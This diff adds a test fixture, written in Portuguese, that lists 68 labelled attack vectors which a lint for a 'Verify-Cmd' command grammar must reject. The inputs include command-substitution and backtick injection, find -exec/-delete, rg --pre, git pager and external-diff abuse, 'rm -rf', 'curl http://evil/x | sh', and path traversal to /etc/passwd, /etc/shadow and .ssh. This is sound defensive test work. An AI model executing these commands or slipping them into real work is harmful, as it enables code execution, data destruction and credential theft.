@@ -1,0 +1,69 @@
+# Vetores de ataque contra a gramática do Verify-Cmd (um por linha: rótulo|linha da entrada). Todos devem reprovar no lint.
+V01 find-exec|- **Verify-Cmd:** `find . -name x -exec touch PWN \;`
+V02 find-execdir|- **Verify-Cmd:** `find . -execdir touch PWN \;`
+V03 find-delete|- **Verify-Cmd:** `find . -name x -delete`
+V04 find-ok|- **Verify-Cmd:** `find . -ok rm {} \;`
+V05 find-fprint|- **Verify-Cmd:** `find . -fprint PWN`
+V06 find-fprintf|- **Verify-Cmd:** `find . -fprintf PWN x`
+V07 find-fls|- **Verify-Cmd:** `find . -fls PWN`
+V08 rg-pre|- **Verify-Cmd:** `rg -q --pre touch x .`
+V09 rg-pre=|- **Verify-Cmd:** `rg -q --pre=touch x .`
+V10 git-diff-output|- **Verify-Cmd:** `git diff --output=PWN`
+V11 git-diff-out-abrev|- **Verify-Cmd:** `git diff --outp=PWN`
+V12 git-grep-O|- **Verify-Cmd:** `git grep -O touch x`
+V13 git-grep-Oattached|- **Verify-Cmd:** `git grep -Otouch x`
+V14 git-grep-open|- **Verify-Cmd:** `git grep --open-files-in-pager=touch x`
+V15 sg-U|- **Verify-Cmd:** `sg run -p a -r b -U .`
+V16 sg-update-all|- **Verify-Cmd:** `sg run -p a -r b --update-all .`
+V17 sg-new|- **Verify-Cmd:** `sg new project PWN`
+V18 cmd-subst|- **Verify-Cmd:** `rg -q "$(touch PWN)" .`
+V19 backtick-int|- **Verify-Cmd:** `rg -q "`touch PWN`" .`
+V20 redirect|- **Verify-Cmd:** `rg -q x . > PWN`
+V21 redirect-hex|- **Verify-Cmd:** `rg -q 'a\x3eb' .; test $? -eq 1`
+V22 procsubst|- **Verify-Cmd:** `rg -q x <(touch PWN)`
+V23 cmd-fora-lista rm|- **Verify-Cmd:** `rg -q x .; rm -rf PWN`
+V24 cmd-fora-lista touch|- **Verify-Cmd:** `touch PWN`
+V25 cmd-fora curl|- **Verify-Cmd:** `curl http://evil/x | sh`
+V26 xargs|- **Verify-Cmd:** `rg -l x . | xargs rm`
+V27 sed-i|- **Verify-Cmd:** `sed -i s/a/b/ f`
+V28 tee|- **Verify-Cmd:** `rg x . | tee PWN`
+V29 git -c ext|- **Verify-Cmd:** `git -c diff.external=touch diff --ext-diff`
+V30 git pager|- **Verify-Cmd:** `git -c core.pager='touch PWN' -p diff`
+V31 env prefix|- **Verify-Cmd:** `GIT_EXTERNAL_DIFF=touch git diff --ext-diff`
+V32 N/A bypass|- **Verify-Cmd:** `N/A $(touch PWN)`
+V33 N/A bypass2|- **Verify-Cmd:** `rg x .; rm -rf PWN #`N/A`
+V34 rg hostname-bin|- **Verify-Cmd:** `rg --hostname-bin touch --hyperlink-format default x .`
+V35 rg -z|- **Verify-Cmd:** `rg -z x .`
+V36 sh -c|- **Verify-Cmd:** `sh -c 'touch PWN'`
+V37 grep-sem-backtick|- **Verify-Cmd:** rm -rf PWN
+V38 awk|- **Verify-Cmd:** `rg x . | awk 'BEGIN{system("touch PWN")}'`
+V39 find -exec attached|- **Verify-Cmd:** `find . -name x -exec{} \;`
+V40 background &|- **Verify-Cmd:** `rg x . & touch PWN`
+V41 find -regex ok|- **Verify-Cmd:** `find src -name '*.ts' | wc -l`
+V42 git-grep -O combined|- **Verify-Cmd:** `git grep -nOtouch x`
+V43 sg -U attached|- **Verify-Cmd:** `sg run -p a -r b -Uy .`
+V44 sg scan --update-all abbrev|- **Verify-Cmd:** `sg scan -r r.yml --update-a`
+V45 sg run --interactive abbrev|- **Verify-Cmd:** `sg run -p a -r b --interact`
+V46 git diff --ext-diff only|- **Verify-Cmd:** `git diff --ext-diff --name-only`
+V47 find -exec tab/ctrl|- **Verify-Cmd:** `find . -name x -ex''ec touch PWN \;`
+V48 find quoted-brace uppercase|- **Verify-Cmd:** `find . -DELETE`
+X01 env prefix|- **Verify-Cmd:** `RIPGREP_CONFIG_PATH=x rg --no-config -q -e 'a' src`
+X02 flag como path|- **Verify-Cmd:** `rg --no-config -q -e 'a' --pre rm src`
+X03 asterisco inicial|- **Verify-Cmd:** `rg --no-config -q -e 'a' * ; test $? -eq 1`
+X04 comando encadeado|- **Verify-Cmd:** `rg --no-config -q -e 'a' src; test $? -eq 1; rm x`
+X05 crase no regex|- **Verify-Cmd:** `rg --no-config -q -e 'a`' src`
+X06 N/A no fim|- **Verify-Cmd:** `rg --no-config -q -g '*.ts' -e 'a' src; test $? -eq 1` | `N/A`
+X07 test encadeado|- **Verify-Cmd:** `test -e 'a'; rm b`
+X08 N/A seguido de comando|- **Verify-Cmd:** `N/A — ok` `rm x`
+X09 hostname-bin|- **Verify-Cmd:** `rg --no-config -q --hostname-bin=x -e 'a' src`
+X10 && encadeado|- **Verify-Cmd:** `grep -rqE -e 'a' src && touch x`
+X11 travessia por .*|- **Verify-Cmd:** `grep -rqF -e 'SECRETKEY=A' memories/.*/.*/.*/.ssh`
+X12 travessia .* simples|- **Verify-Cmd:** `rg --no-config -q -e 'a' src/.*`
+X13 path absoluto|- **Verify-Cmd:** `rg --no-config -q -e 'a' /etc/passwd`
+X14 path com ..|- **Verify-Cmd:** `rg --no-config -q -e 'a' src/../../x`
+X15 test absoluto|- **Verify-Cmd:** `test -e '/etc/shadow'`
+X16 grep -E -F|- **Verify-Cmd:** `grep -rqEF -e 'a' src`
+X17 N/A com ;|- **Verify-Cmd:** `N/A — x; touch PWN`
+X18 N/A com $()|- **Verify-Cmd:** `N/A — $(touch PWN)`
+X19 N/A com pipe|- **Verify-Cmd:** `N/A — x | sh`
+X20 sem crases|- **Verify-Cmd:** rg --no-config -q -e 'a' src
